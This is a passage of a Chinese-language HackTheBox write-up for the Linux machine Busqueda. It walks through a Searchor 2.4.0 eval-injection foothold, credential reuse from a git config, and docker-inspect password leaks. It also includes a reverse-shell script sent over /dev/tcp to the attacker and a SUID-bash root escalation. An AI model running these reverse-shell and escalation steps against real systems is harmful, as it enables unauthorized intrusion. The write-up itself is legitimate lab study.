---
tags:
  - HTB/Easy
  - HTB/Linux
---

## 扫描

常规22、80端口

## 漏洞分析

### 80端口

IP无法访问，需要写hosts文件。域名即浏览器自动替换的那个。或者可以 `curl -I <IP>` 看报头的 `Location` 字段。

- Powered by Flask and Searchor 2.4.0


## Initial Access

### PoC

谷歌一下 `Searchor 2.4.0` 的PoC：
> <https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit->

按PoC所说，将payload放进query参数，反弹shell成功。



## flag: user

```bash
└─$ nc -lvnp 4445 
listening on [any] 4445 ...
connect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.208] 35966
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
$ pwd
/var/www/app
$ cd
$ ls
user.txt
$ cat user.txt
ed5d……8455
```


## 探索

### git探索

在svc的家目录发现有gitconfig。于是猜想是否能翻找git历史信息获得敏感信息：
```bash
$ ls -al
total 36
drwxr-x--- 4 svc  svc  4096 Apr  3 08:58 .
drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 May 16 14:01 user.txt

$ cat .gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks


$ find / -name "*git*" 2>/dev/null
……
/var/www/app/.git
……
/opt/scripts/.git
```

先探索一下 `/var/www/app/.git`：
```bash
$ cd /var/www/app/.git
$ ls
branches
COMMIT_EDITMSG
config
description
HEAD
hooks
index
info
logs
objects
refs
$ git log
fatal: detected dubious ownership in repository at '/var/www/app/.git'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/app/.git
```

似乎有权限问题，姑且按照git的提示执行一下它给的命令。  
然后居然就可以看了：
```bash
$ git config --global --add safe.directory /var/www/app/.git
$ git log
commit 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4
Author: administrator <administrator@gitea.searcher.htb>
Date:   Sun Dec 25 12:14:21 2022 +0000

    Initial commit

$ git cat-file -p 5ede9e
tree 467e53ba0d917346fd36b48c04f6a60a27f072f5
author administrator <administrator@gitea.searcher.htb> 1671970461 +0000
committer administrator <administrator@gitea.searcher.htb> 1671970461 +0000

Initial commit
$ git cat-file -p 467e
100644 blob 4e76fdc6500eba1bfb9d9dc9017bd6481550ee2d    app.py
040000 tree a02efc014401c058dca8aa73670f3283aa08a245    templates
```

不过探索到最后发现没什么意义，想想也是傻了在这里浪费时间。  
因为这是第一次commit，内容就是 `/var/www/app/` 下的项目，也即我们最开始访问的网页。

另一个，`/opt/scripts/.git` 由于是root权限所以也无法探索。

#### 发现密码和子域

然后看看config文件，发现一个子域：
```bash
$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

实际上还有cody的账号密码（cody:jh1usoih2bkjaspwe92）。  
将子域 `gitea.searcher.htb` 也加入hosts，可以用cody的账号密码登陆。  
不过进去也没发现什么有用的信息。

倒是有个 `administrator` 用户。不知道能不能拿这个用户的密码，说不定就是root。  

### 密码重复 - SSH

*……卡了很久……谁想到svc的SSH密码竟然和cody一样。后来复习hacktricks，发现其实[这里](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#known-passwords)有提到，只是以前草草扫过根本没印象。*  
原来cody的密码svc也能用……*后来看[0xdf的WP](https://0xdf.gitlab.io/2023/08/12/htb-busqueda.html#shell-as-root)才发现，原来svc的用户名就是cody……*  
虽然本身就有svc的shell，不过有没有密码一个很大的不同就是是否能查看 `sudo -l`。以及在这之前，还是换成SSH连接吧。

### sudo探索

SSH登陆后，知道密码的情况下先看看sudo：
```bash
svc@busqueda:~$ sudo -l
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *


svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 3 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 3 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect ps f84a6b33fb5a
ps
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect id f84a6b33fb5a
id
```

#### 利用sudo获得敏感信息

像是docker本身的命令然后用连字符连接组成的新命令。然后尝试了几次运行这个 `docker-inspect` 命令，不过由于不懂这个 `<format>` 是指啥。于是搜了一波：

> <https://docs.docker.jp/config/formatting.html#json>  
> <https://docs.docker.com/engine/reference/commandline/inspect/#get-a-subsection-in-json-format>

看来可以将容器启动时的配置信息用json输出：
```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' f84a6b33fb5a
{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

注意到：
```bash
"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
"MYSQL_USER=gitea",
"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
"MYSQL_DATABASE=gitea",
```

尝试用root登陆SSH失败。

### gitea登陆administrator

回到gitea，尝试登陆administrator账号。竟然不是用MYSQL_ROOT_PASSWORD，而是MYSQL_PASSWORD。这台靶机的密码都有点迷……

里面有个私人仓库，扫了一圈注意到 `full-checkup.sh`：
```bash
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

*其实前阵子也想着学学python的subprocess库来着，感觉这是个不错的例子。*

其中 `arg_list = ['./full-checkup.sh']` 指示运行当前目录下的脚本。应该是个可以利用的点：自建同名脚本，执行反向shell连接。


## Privilege Escalation

### sudo提权（机器本身路线）

```bash
靶机：
svc@busqueda:~/.local$ cat full-checkup.sh 
#!/usr/bin/bash
/bin/bash -i >& /dev/tcp/10.xx.xx.xx/4446 0>&1

svc@busqueda:~/.local$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup


Kali：
└─$ nc -lvnp 4446    
listening on [any] 4446 ...
connect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.208] 41116
root@busqueda:/home/svc/.local# id
id
uid=0(root) gid=0(root) groups=0(root)
```

注意：由于是 `./` 执行脚本，所以需要在脚本开头写Shebang，以及给脚本赋予执行权限。

### SUID提权（非机器本身路线）

枚举SUID，注意到有个bash我都惊了。想着不会这么简单吧，试了一下竟然直接root了……

*后来感觉可能是其他玩家getshell留下的操作。于是重置了一下，果然这个bash就消失了。于是又重新打了一遍。即上一小节的内容。*

```bash
$ find / -perm -4000 -exec ls -l "{}" \; 2>/dev/null
……
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /usr/bin/bash
……

$ which bash
/usr/bin/bash
$ bash -p 
id
uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root)
```


## flag: root

```bash
cd /root
ls
ecosystem.config.js
root.txt
scripts
snap
cat root.txt
05d0……9f41
```

---

## 总结·后记

2023/05/16

大概是我打过的最简单的机器了……  

不过主要是因为初始访问已经在github有PoC，看时间应该也是一位打这个靶机的玩家所创建的仓库。所以实质上自己和看WP没什么差别了。希望自己也能写出一个PoC吧！

而root简直过于快了……感觉设计者本身的root提权应该不是这样？1秒root，十分舒畅。

*后来发现天真了。只是站在了巨人的肩膀上。自己重置靶机后再按常规路线打一遍也不大容易，主要是一直没想过真有密码重复这种过于简单的思路……以后也要注意这方面的利用了*



### 稍微改一下扫描的工作流

```bash
#!/usr/bin/bash
# -*- coding:utf-8 -*-

## This script is requires root privilege for running.
set -eu

HTB_IP=${1}

echo "[info] Starting ports scan..."
nmap -n -Pn -sS -p 1-10000 --min-rate=5000 ${HTB_IP} | tee "${HTB_IP}_ports_1-10000.nmap"

echo "[info] Starting base scan..."
ports=$(cat "${HTB_IP}_ports_1-10000.nmap" | grep ^[0-9] | cut -d / -f1 | tr '\n' ',' | sed s/,$//)
nmap -v -n -Pn -sV -O -p ${ports} ${HTB_IP} | tee "${HTB_IP}_baseScan.nmap"
echo "[info] Base scan is Done."

echo "[info] Starting NSE vuln scan..."
nohup nmap -v -n -Pn -p ${ports} --script=vuln ${HTB_IP} > "${HTB_IP}_vuln.nmap" 2>&1 &
echo "[info] Running NSE vuln scan background..."
echo "[info] You could check nmap status with command later: ps -ef | grep 'nmap -v -n -Pn'"

echo "[info] ==============================================="

echo "[info] Checking if there is domain for add to hosts..."
HEADER_Location=$(curl -I ${HTB_IP} | grep "Location:")

if [[ ${HEADER_Location} != '' ]];then
  HTB_DOMAIN=$(echo ${HEADER_Location} | grep -oP '(?<=Location: http://).*' | tr -d '/\r')
  echo "[info] HTB_DOMAIN: ${HTB_DOMAIN}"

  if [[ ${HTB_DOMAIN} != '' ]];then
    # for backup
    echo "[info] -------- Back up hosts --------"
    cat -e /etc/hosts
    echo "[info] -------- Backed up hosts --------"

    echo "[info] -------- Add HTB_DOMAIN(${HTB_DOMAIN}) to hosts --------"
    echo "${HTB_IP}    ${HTB_DOMAIN}" >> /etc/hosts
    echo "[info] -------- Modified hosts --------"
    
    echo "[info] -------- Show now hosts --------"
    cat -e /etc/hosts

#     echo "[info] Scanning subdomain..."
#     gobuster vhost -u ${HTB_DOMAIN} -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -t 500 --append-domain -o "subdomains_${HTB_DOMAIN}.txt"
#     echo "[info] Subdomain scan is Done."
  fi
fi

echo "[info] ==============================================="
echo "[info] The NSE vuln scan maybe still running..."
echo "[info] Show ps..."
ps -ef | grep 'nmap -v -n -Pn'
echo "[info] ==============================================="
echo "[info] Please check nmap status with command: ps -ef | grep 'nmap -v -n -Pn'"
```

### 马后炮地尝试自己分析一下PoC：

1. 谷歌搜服务和版本  
1. [此处](https://security.snyk.io/package/pip/searchor/2.4.0)说eval有漏洞，升到2.4.2即可修复，于是在gitlab搜目标项目[对比2.4.0和2.4.2的关于eval的改动](https://github.com/ArjunSharda/Searchor/compare/v2.4.0...v2.4.2)

        改动如下：
        
        url = eval( f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})" )
        ↓
        url = Engine[engine].search(query, copy_url=copy, open_web=open)

1. 看上去 `query` 参数是用单引号闭合的，应该可以注入
1. 开burp尝试一下在 `query` 参数注入单引号。发现有/无单引号其结果会不同，应该可以注入
1. 构造PoC：……
1. 构造Exp：反弹shell

#### 构造PoC

简单地搜一下 `python eval() 注入`